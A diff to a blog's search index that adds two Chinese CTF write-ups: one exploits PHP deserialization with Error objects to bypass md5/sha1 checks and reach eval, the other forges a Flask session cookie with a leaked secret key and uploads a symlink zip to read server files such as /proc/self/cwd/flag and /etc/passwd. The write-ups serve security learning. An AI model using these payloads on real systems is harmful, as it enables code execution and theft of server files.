@@ -4,6 +4,68 @@
   
   
   <entry>
+    <title>极客大挑战 2020 Greatphp</title>
+    <link href="/2021/09/07/BUU93/"/>
+    <url>/2021/09/07/BUU93/</url>
+    
+    <content type="html"><![CDATA[<h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><p>给了源码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;    <span class="hljs-keyword">public</span> $syc;    <span class="hljs-keyword">public</span> $lover;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>( (<span class="hljs-keyword">$this</span>-&gt;syc != <span class="hljs-keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="hljs-keyword">$this</span>-&gt;syc) === md5(<span class="hljs-keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="hljs-keyword">$this</span>-&gt;syc)=== sha1(<span class="hljs-keyword">$this</span>-&gt;lover)) )&#123;           <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;syc, $match))&#123;               <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;syc);           &#125; <span class="hljs-keyword">else</span> &#123;               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);           &#125;                   &#125;    &#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;    unserialize($_GET[<span class="hljs-string">&#x27;great&#x27;</span>]);&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><ul><li>利用Error原生类绕过<code>md5</code>和<code>sha1</code>      </li></ul><p>本地测试</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;llnn&quot;</span>,<span class="hljs-number">1</span>);$b = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;llnn&quot;</span>,<span class="hljs-number">2</span>);<span class="hljs-keyword">echo</span> $a;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $b;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">if</span>($a != $b)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a!=b&quot;</span>;&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">if</span>(md5($a) === md5($b))&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;md5 success&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125;<span class="hljs-keyword">if</span>(sha1($a)=== sha1($b))&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sha1 success&quot;</span>;&#125;</code></pre><p>测试结果<br><code>$a = new Error(&quot;llnn&quot;,1);</code>和<code>$b = new Error(&quot;llnn&quot;,2);</code>不在一行的话<code>md5</code>和<code>sha1</code>是不等的 </p><p><img src="https://s3.bmp.ovh/imgs/2021/09/565130a04e84fd98.png">      </p><p>而且<code>llnn</code>那里，也就是Error类的第一个参数是可控的，所以可以这样：<code>?&gt;&lt;?=phpinfo();?&gt;</code>但有过滤，小括号和<code>/</code>都不能用，可以直接<code>include /flag</code>;将<code>/flag</code>url编码取反绕过</p><pre><code>php &gt; echo urlencode(~&#39;/flag&#39;);%D0%99%93%9E%98php &gt; echo ~urldecode(&#39;%D0%99%93%9E%98&#39;);/flag</code></pre><p>payload：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<span class="hljs-keyword">public</span> $syc;<span class="hljs-keyword">public</span> $lover;&#125;$str = <span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="hljs-string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="hljs-string">&quot;?&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $str.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;$a=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>($str,<span class="hljs-number">1</span>);$b=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>($str,<span class="hljs-number">2</span>);<span class="hljs-keyword">echo</span> $a.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $b.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;$c = <span class="hljs-keyword">new</span> SYCLOVER();$c-&gt;syc = $a;$c-&gt;lover = $b;<span class="hljs-keyword">echo</span>(urlencode(serialize($c))); <span class="hljs-meta">?&gt;</span></code></pre>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+      <category>php</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CTF</tag>
+      
+      <tag>WP</tag>
+      
+      <tag>php</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>SWPU2019 Web3</title>
+    <link href="/2021/09/05/BUU92/"/>
+    <url>/2021/09/05/BUU92/</url>
+    
+    <content type="html"><![CDATA[<h2 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h2><p>打开环境<br><img src="https://s3.bmp.ovh/imgs/2021/09/30ed24f91e126fbf.png"><br>随便登个admin  admin<br><img src="https://s3.bmp.ovh/imgs/2021/09/e5c98883e53ffd6e.png"><br>点击<code>upload</code>会得到<code>Permission denied!</code><br>注意到网站标题是<code>CTF-Flask-Demo</code>,所以去解一下session<br>解密脚本：</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-comment"># flask-session-cookie-manager-master  也能解session</span><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> zlib<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> session_json_serializer<span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decryption</span>(<span class="hljs-params">payload</span>):</span>    payload, sig = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)    payload, timestamp = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)    decompress = <span class="hljs-literal">False</span>    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):        payload = payload[<span class="hljs-number">1</span>:]        decompress = <span class="hljs-literal">True</span>    <span class="hljs-keyword">try</span>:        payload = base64_decode(payload)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not base64 decode the payload because of &#x27;</span>                         <span class="hljs-string">&#x27;an exception&#x27;</span>)    <span class="hljs-keyword">if</span> decompress:        <span class="hljs-keyword">try</span>:            payload = zlib.decompress(payload)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not zlib decompress the payload before &#x27;</span>                             <span class="hljs-string">&#x27;decoding the payload&#x27;</span>)    <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    print(decryption(sys.argv[<span class="hljs-number">1</span>].encode()))</code></pre><pre><code>PS D:\Users\L--N\Desktop\FILES\py\some&gt; python session_de.py .eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFxjxhY.YTTKww.1GFMAbE2U50IAvkhmpCtlVyULYg&#123;&#39;id&#39;: b&#39;100&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;</code></pre><p>之后伪造cookie,让id为<code>b&#39;1&#39;</code>,需要key</p><p>然后，如果访问网站不存在的路由会返回<code>404 not found</code>但status是200，在响应头里有：<code>Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==</code></p><p>base64解码后得到：<code>SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</code>    </p><p>然后用<code>flask-session-cookie-manager</code>加密即可</p><pre><code>PS D:\Users\L--N\Desktop\FILES\flask-session-cookie-manager-master&gt; python .\flask_session_cookie_manager3.py encode -s &#39;keyqqqwwweee!@#$%^&amp;*&#39; -t &quot;&#123;&#39;id&#39;: b&#39;1&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;&quot;.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.YTTLwQ.WmaEwPJAp37kCXwjJt6tSxM9prM</code></pre><p><code>/upload</code>页面更换cookie</p><p><img src="https://s3.bmp.ovh/imgs/2021/09/a488570f16605e2e.png">    </p><p>得到文件上传的页面，且注释中有源码</p><pre><code class="hljs python"><span class="hljs-meta">@app.route(&#x27;/upload&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>():</span>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;id&#x27;</span>] != <span class="hljs-string">b&#x27;1&#x27;</span>:        <span class="hljs-keyword">return</span> render_template_string(temp)    <span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&#x27;POST&#x27;</span>:        m = hashlib.md5()        name = session[<span class="hljs-string">&#x27;password&#x27;</span>]        name = name+<span class="hljs-string">&#x27;qweqweqwe&#x27;</span>        name = name.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)        m.update(name)        md5_one= m.hexdigest()        n = hashlib.md5()        ip = request.remote_addr        ip = ip.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)        n.update(ip)        md5_ip = n.hexdigest()        f=request.files[<span class="hljs-string">&#x27;file&#x27;</span>]        basepath=os.path.dirname(os.path.realpath(__file__))        path = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span>+md5_one+<span class="hljs-string">&#x27;/&#x27;</span>+session[<span class="hljs-string">&#x27;username&#x27;</span>]+<span class="hljs-string">&quot;/&quot;</span>        path_base = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span>        filename = f.filename        pathname = path+filename        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;zip&quot;</span> != filename.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">-1</span>]:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;zip only allowed&#x27;</span>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path_base):            <span class="hljs-keyword">try</span>:                os.makedirs(path_base)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path):            <span class="hljs-keyword">try</span>:                os.makedirs(path)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(pathname):            <span class="hljs-keyword">try</span>:                f.save(pathname)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        <span class="hljs-keyword">try</span>:            cmd = <span class="hljs-string">&quot;unzip -n -d &quot;</span>+path+<span class="hljs-string">&quot; &quot;</span>+ pathname            <span class="hljs-keyword">if</span> cmd.find(<span class="hljs-string">&#x27;|&#x27;</span>) != <span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> cmd.find(<span class="hljs-string">&#x27;;&#x27;</span>) != <span class="hljs-number">-1</span>:waf()                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>            os.system(cmd)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        unzip_file = zipfile.ZipFile(pathname,<span class="hljs-string">&#x27;r&#x27;</span>)        unzip_filename = unzip_file.namelist()[<span class="hljs-number">0</span>]        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;is_login&#x27;</span>] != <span class="hljs-literal">True</span>:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;not login&#x27;</span>        <span class="hljs-keyword">try</span>:            <span class="hljs-keyword">if</span> unzip_filename.find(<span class="hljs-string">&#x27;/&#x27;</span>) != <span class="hljs-number">-1</span>:                shutil.rmtree(path_base)                os.mkdir(path_base)                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>            image = <span class="hljs-built_in">open</span>(path+unzip_filename, <span class="hljs-string">&quot;rb&quot;</span>).read()            resp = make_response(image)            resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span>            <span class="hljs-keyword">return</span> resp        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            shutil.rmtree(path_base)            os.mkdir(path_base)            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<span class="hljs-meta">@app.route(&#x27;/showflag&#x27;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">showflag</span>():</span>    <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == <span class="hljs-literal">False</span>:        image = <span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="hljs-string">&quot;rb&quot;</span>).read()        resp = make_response(image)        resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span>        <span class="hljs-keyword">return</span> resp    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;can&#x27;t give you&quot;</span></code></pre><p>两个路由，第一个要求上传个图片压缩包，第二个说明flag在flask根目录下的flag里的flag.jpg中</p><p><code>showflag()</code>路由的<code>True==False</code>是恒<code>False</code>的，所以不能通过第二个路由拿到flag，这里通过第一个路由上传个软链接读取文件      </p><p><code>ln -s</code>是Linux的一种软连接，相当于Windows的快捷方式<br>比如</p><pre><code>┌──(root💀kali)-[~/桌面]└─# ln -s /etc/passwd test       </code></pre><p>打开<code>test</code>中就是<code>/etc/passwd</code>中的内容了        </p><p><code>/proc/self</code> 记录了系统运行的信息状态等,<code>cwd</code>指向当前进程运行目录的一个符号链接,即flask运行进程目录      </p><p>payload:   </p><pre><code>┌──(root💀kali)-[~]└─# ln -s /proc/self/cwd/flag/flag.jpg test┌──(root💀kali)-[~]└─# zip -ry test.zip test</code></pre><p>然后将<code>test.zip</code>上传即可得到flag<br><img src="https://s3.bmp.ovh/imgs/2021/09/f2435ead4e20cf6f.png"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+      <category>flask</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CTF</tag>
+      
+      <tag>WP</tag>
+      
+      <tag>flask</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Bnv</title>
     <link href="/2021/08/01/BUU91/"/>
     <url>/2021/08/01/BUU91/</url>
@@ -324,9 +386,9 @@
       
       <tag>php</tag>
       
-      <tag>upload</tag>
-      
       <tag>getshell</tag>
+      
+      <tag>upload</tag>
       
     </tags>
     
@@ -559,11 +621,11 @@
       
       <tag>CTF</tag>
       
+      <tag>WP</tag>
+      
       <tag>文件读取</tag>
       
       <tag>php://filter/string.strip_tags</tag>
-      
-      <tag>WP</tag>
       
     </tags>
     
@@ -592,11 +654,11 @@
       
       <tag>CTF</tag>
       
-      <tag>WP</tag>
-      
       <tag>unserialize</tag>
       
       <tag>char.escape</tag>
+      
+      <tag>WP</tag>
       
     </tags>
     
@@ -2652,17 +2714,6 @@
   
   
   <entry>
-    <title>About</title>
-    <link href="/"/>
-    <url>/</url>
-    
-    <content type="html"><![CDATA[]]></content>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>404</title>
     <link href="/"/>
     <url>/</url>
@@ -2674,7 +2725,7 @@
   
   
   <entry>
-    <title>Friends</title>
+    <title>关于</title>
     <link href="/"/>
     <url>/</url>
     
@@ -2685,7 +2736,18 @@
   
   
   <entry>
-    <title>关于</title>
+    <title>About</title>
+    <link href="/"/>
+    <url>/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Categories</title>
     <link href="/"/>
     <url>/</url>
     
@@ -2718,7 +2780,7 @@
   
   
   <entry>
-    <title>Categories</title>
+    <title>Friends</title>
     <link href="/"/>
     <url>/</url>
     
